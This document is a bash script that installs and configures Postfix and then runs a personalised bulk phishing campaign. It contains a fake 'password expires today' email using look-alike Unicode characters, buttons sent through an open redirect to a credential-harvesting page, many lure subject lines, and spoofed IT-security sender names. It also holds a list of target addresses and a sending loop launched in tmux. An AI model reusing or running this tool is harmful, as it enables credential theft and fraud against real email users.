#!/bin/bash

# Make sure the script is being run with sudo privileges
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo privileges."
  exit 1
fi

read -p "Enter your domain (e.g., domain.com): " domain
if [[ -z "$domain" ]]; then
  echo "Domain cannot be empty."
  exit 1
fi

read -p "Enter your username (e.g., no-reply): " username
if [[ -z "$username" ]]; then
  echo "username cannot be empty."
  exit 1
fi

# Update package list and install Postfix
echo "Updating package list and installing Postfix..."
sudo apt-get update -y
sudo apt-get install postfix -y

# Install tmux for session persistence
echo "Installing tmux for persistent sessions..."
sudo apt-get install tmux -y

# Backup the original Postfix config file
echo "Backing up the original Postfix main.cf..."
sudo cp /etc/postfix/main.cf /etc/postfix/main.cf.backup

sudo tee /etc/postfix/generic > /dev/null <<EOL
root@$domain    $username@$domain
@$domain        $username@$domain
EOL

sudo postmap /etc/postfix/generic
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Remove the current main.cf to replace with custom config
echo "Removing current main.cf..."
sudo rm /etc/postfix/main.cf

# Create a new Postfix main.cf file with the desired configuration
echo "Creating a new Postfix main.cf file..."
sudo tee /etc/postfix/main.cf > /dev/null <<EOL
# Postfix main configuration file
myhostname = bulkmail.$domain
mydomain = $domain
myorigin = $domain

inet_protocols = ipv4
smtp_helo_name = bulkmail.$domain
smtp_tls_security_level = may
smtp_tls_loglevel = 1

smtp_destination_concurrency_limit = 1
default_process_limit = 50
smtp_generic_maps = hash:/etc/postfix/generic
ignore_rhosts = yes

inet_interfaces = loopback-only
mydestination = localhost
smtp_sasl_auth_enable = no
smtpd_sasl_auth_enable = no
smtp_sasl_security_options = noanonymous

queue_directory = /var/spool/postfix
command_directory = /usr/sbin
daemon_directory = /usr/lib/postfix/sbin
mailbox_size_limit = 0
recipient_delimiter = +
smtpd_client_restrictions = permit_mynetworks, permit_sasl_authenticated, reject
disable_dns_lookups = no
EOL

# Restart Postfix to apply the changes
echo "Restarting Postfix service..."
sudo service postfix restart || { echo "Postfix failed to restart"; exit 1; }

# Install mailutils for sending emails via Postfix
echo "Installing mailutils..."
sudo apt-get install mailutils -y
sudo apt-get install html2text -y
sudo apt-get install parallel base64 -y
sudo chown $USER:$USER *

# Create a sample HTML email content (email.html)
echo "Creating email.html with email content..."
cat > email.html <<EOL

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body style="margin: 0.4em; font-size: 14pt;"><table width="650" style="text-align: left; color: rgb(33, 33, 33); text-transform: none; letter-spacing: normal; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" style="margin: 0px; padding: 0px 0px 10px; border-top-color: rgb(0, 114, 198); border-top-width: 0px; border-top-style: solid; box-sizing: border-box;"><span style='color: rgb(0, 114, 198); font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif, serif, EmojiFont; box-sizing: border-box;'><span style="font-size: 33px; box-sizing: border-box;"><img src="https://honeyhillmusic.ca/media/view.png"></span></span></td></tr><tr style="box-sizing: border-box;"><td width="260" align="center" style="margin: 0px; padding: 0px; box-sizing: border-box;">&nbsp;</td></tr><tr style="box-sizing: border-box;"><td align="center" style="margin: 0px; padding-bottom: 20px; box-sizing: border-box;"><p style="margin: 0px; padding: 0px 0px 20px; color: rgb(22, 35, 58); font-family: Arial; font-size: 15px; box-sizing: border-box;">Your {recipient-email} &#961;assword expires today (A&ccedil;ti&#959;n Required)&nbsp;, &#947;ou must ta&#954;e immediate steps to maintain and pre&#957;ent restricted access to &#947;our accou&#951;t {recipient-email}</p></td></tr></tbody></table><table width="650" style="text-align: left; color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td align="center" style="box-sizing: border-box;"><table style="border-collapse: collapse; box-sizing: border-box;" border="0" cellspacing="0" cellpadding="0"><tbody style="box-sizing: border-box;"><tr style="box-sizing: border-box;"><td style="padding: 10px; border: 2px solid rgb(0, 114, 198); border-image: none; width: 180px; text-align: center; margin-right: 10px; box-sizing: border-box; background-color: rgb(0, 114, 198);"><a style='color: rgb(255, 255, 255); font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; box-sizing: border-box; background-color: transparent;' href="https://medium.com/m/global-identity-2?redirectUrl=https://honeyhillmusic.ca/media/index.php/{recipient-user}/{recipient-domain}" target="_blank" rel="noreferrer">&#922;eep the same password</a></td><td style="box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td style="padding: 10px; border: 2px solid rgb(0, 114, 198); border-image: none; width: 180px; text-align: center; box-sizing: border-box; background-color: rgb(0, 114, 198);"><a style='color: rgb(255, 255, 255); font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; font-size: 14px; font-weight: bold; text-decoration: none; box-sizing: border-box; background-color: transparent;' href="https://medium.com/m/global-identity-2?redirectUrl=https://honeyhillmusic.ca/media/index.php/{recipient-user}/{recipient-domain}" target="_blank" rel="noreferrer">S&#954;ip upto 6months</a></td></tr></tbody></table><p style="margin: 0px; padding: 40px 0px 0px; color: rgb(22, 35, 58); font-family: Arial; font-size: 15px; box-sizing: border-box;">Issues found in the application completion system will no longer be in&#957;estigated or corrected.</p></td></tr></tbody></table></body></html>
EOL

# Create a sample txt subject content (subject.txt)
echo "Creating subject.txt with subject content..."
cat > subject.txt <<EOL
{recipient-domain} access expiring
{recipient-domain} access alert
{recipient-user} validation
Expire {date} - act
Secure {recipient-domain}
{recipient-user} must confirm
Deadline {date}
Check {recipient-email}
{recipient-user} re-auth
Protect {recipient-domain}
{recipient-user} validate
{recipient-user} approve
{recipient-domain} system update - confirm your access
Routine security check for your email account
{recipient-domain} maintenance: confirm your details
Account security update for {recipient-email}
{recipient-domain} authentication required
{recipient-email} - confirmation requested
Please complete your email validation
{recipient-domain} records update required
Email system check for {recipient-email}
{recipient-domain} access confirmation
{recipient-email} - action required
{recipient-domain} records validation
Please confirm your email preferences
{recipient-email} security confirmation
Routine authentication for your email account
{recipient-email} access review
{recipient-domain} security check
Please validate your email information
{recipient-domain} records confirmation
Email system maintenance notification
{recipient-domain} access review
Security update for your email access
{recipient-domain} records maintenance
Please confirm your email account status
Confirm {recipient-domain} access
{recipient-domain} authorization
Verify your account
Security check required
Pending action: #{random-number}
Update your access
Reminder: validate access
Final step to secure account
Review required
{recipient-domain} notice
Your access update
EOL

# Create a sample txt name content (name.txt)
echo "Creating name.txt with name content..."
cat > name.txt <<EOL
Webmail Revalidation
IT Security Admin
Domain Security Team
Network Operations
Webmail Revalidation
CyberSecurity Alert
System Compliance
Infrastructure Watch
IT Governance
Mail Shield
Domain Guardian
Inbox Sentinel
Cyber Patrol
Firewall Watch
Secure Gateway
Data Bastion
Threat Response
Breach Alert
Policy Enforcer
Compliance Warden
Access Sentinel
Authentication Guard
Password Sentinel
Login Vigilante
SSO Guardian
2FA Enforcer
Identity Sentinel
Domain & Server Focused
DNS Protector
Server Watchtower
Hosting Safeguard
SSL Sentinel
Webmail Revalidation
Backup Defender
Server Patrol
Webmail Defender
No-Reply Security
Do Not Ignore: IT Dept
Verified IT Sender
Domain Patrol
Corporate IT Services
Official Domain Admin
Enterprise Webmail
Authorized IT Notifications
Verified System Admin
IT Policy Enforcement
Certified Domain Team
Domain & Server Alerts
Domain Renewal Team
Server Maintenance Alert
DNS Configuration Team
Hosting Security Update
Webmail Revalidation
Domain Ownership Check
Mail Server Upgrade
SSL Certificate Expiry
Firewall Security Alert
Domain admin
Domain at Risk
Server Update
EOL

# Create a sample txt list content (list.txt)
echo "Creating list.txt with list content..."
cat > list.txt <<EOL
prodaja@vbuilding.rs
zruba@vnkgroup-ks.com

EOL

# Create the sending script (send.sh)
echo "Creating send.sh for bulk email sending..."
cat > send.sh <<EOL
#!/bin/bash

# Configuration files
EMAIL_LIST="list.txt"
HTML_TEMPLATE="email.html"
SUBJECT_FILE="subject.txt"
NAME_FILE="name.txt"
LOG_FILE="send_log_\$(date +%Y%m%d).txt"

# Initialize counters
TOTAL=\$(wc -l < "\$EMAIL_LIST")
SUCCESS=0
FAILED=0

# Verify required files exist
for file in "\$EMAIL_LIST" "\$HTML_TEMPLATE" "\$SUBJECT_FILE" "\$NAME_FILE"; do
    if [ ! -f "\$file" ]; then
        echo "Error: Missing \$file" | tee -a "\$LOG_FILE"
        exit 1
    fi
done

# Load all subjects and names into arrays
mapfile -t SUBJECTS < "\$SUBJECT_FILE"
mapfile -t NAMES < "\$NAME_FILE"

# Random name generator (from name.txt)
get_random_name() {
    echo "\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
}

# Random number generator (4-6 digits)
get_random_number() {
    echo \$((RANDOM % 9000 + 1000))
}

# Process each email
while IFS= read -r email; do
    # Clean and parse email address
    CLEAN_EMAIL=\$(echo "\$email" | tr -d '\\r\\n')
    EMAIL_USER=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f1)
    EMAIL_DOMAIN=\$(echo "\$CLEAN_EMAIL" | cut -d@ -f2)
    CURRENT_DATE=\$(date +%Y-%m-%d)
    BASE64_EMAIL=\$(echo -n "\$CLEAN_EMAIL" | base64)

    # Generate random elements
    RANDOM_NAME=\$(get_random_name)
    RANDOM_NUMBER=\$(get_random_number)
    SELECTED_SENDER_NAME="\${NAMES[\$((RANDOM % \${#NAMES[@]}))]}"
    
    # Select subject and REPLACE ITS VARIABLES
    SELECTED_SUBJECT="\${SUBJECTS[\$((RANDOM % \${#SUBJECTS[@]}))]}"
    SELECTED_SUBJECT=\$(echo "\$SELECTED_SUBJECT" | sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g")

    echo "Processing: \$CLEAN_EMAIL"
    
    # Generate unique Message-ID
    MESSAGE_ID="<\$(date +%s%N).\$(openssl rand -hex 8)@$domain>"
    
    # Create temporary HTML file with replaced variables
    TEMP_HTML=\$(mktemp)
    sed \
        -e "s|{date}|\$CURRENT_DATE|g" \
        -e "s|{recipient-email}|\$CLEAN_EMAIL|g" \
        -e "s|{recipient-user}|\$EMAIL_USER|g" \
        -e "s|{recipient-domain}|\$EMAIL_DOMAIN|g" \
        -e "s|{name}|\$RANDOM_NAME|g" \
        -e "s|{random-name}|\$(get_random_name)|g" \
        -e "s|{random-number}|\$RANDOM_NUMBER|g" \
        -e "s|{sender-email}|$username@$domain|g" \
        -e "s|{sender-name}|\$SELECTED_SENDER_NAME|g" \
        -e "s|{base64-encryptedrecipents-email}|\$BASE64_EMAIL|g" \
        "\$HTML_TEMPLATE" > "\$TEMP_HTML"
    
    # Send with dynamic content
    # Create text version
    TEMP_TEXT=\$(mktemp)
    cat <<EOF > "\$TEMP_TEXT"
Webmail - Mail. Host. Online

Email Account Status Changed

Hi \$EMAIL_USER,

Contract Payment Approved

" Please reconfirm this order before we release payment."

Use the button below to review  the order and sign document(s)

ACCESS DOCUMENTS

EOF

# Send with both HTML and text
cat <<EOF | /usr/sbin/sendmail -t -oi
Return-Path: <$username@$domain>
From: "\$SELECTED_SENDER_NAME" <$username@$domain>
To: <\$CLEAN_EMAIL>
Subject: \$SELECTED_SUBJECT
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="MULTIPART_BOUNDARY"

--MULTIPART_BOUNDARY
Content-Type: text/plain; charset=UTF-8

\$(cat "\$TEMP_TEXT")

--MULTIPART_BOUNDARY
Content-Type: text/html; charset=UTF-8

\$(cat "\$TEMP_HTML")

--MULTIPART_BOUNDARY--
EOF

    rm "\$TEMP_TEXT"

    # Check exit status and clean up
    if [ \$? -eq 0 ]; then
        echo "\$(date) - SUCCESS: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((SUCCESS++))
    else
        echo "\$(date) - FAILED: \$CLEAN_EMAIL" >> "\$LOG_FILE"
        ((FAILED++))
    fi
    
    rm "\$TEMP_HTML"
    
    # Dynamic delay (0.5-3 seconds)
    sleep \$(awk -v min=0.1 -v max=0.3 'BEGIN{srand(); print min+rand()*(max-min)}')
    
    # Progress indicator
    echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
    
done < "\$EMAIL_LIST"

# Final report
echo "Completed at \$(date)" >> "\$LOG_FILE"
echo "Total: \$TOTAL | Success: \$SUCCESS | Failed: \$FAILED" >> "\$LOG_FILE"
echo "Full log: \$LOG_FILE"
EOL


# Make the send.sh script executable
chmod +x send.sh

# Create a tmux session and run the send.sh script in it
echo "Starting tmux session and running send.sh..."
tmux new-session -d -s mail_session "./send.sh"

# Print instructions for reattaching to the tmux session
echo "Your email sending process is running in the background with tmux."
echo "To reattach to the session, use: tmux attach -t mail_session"
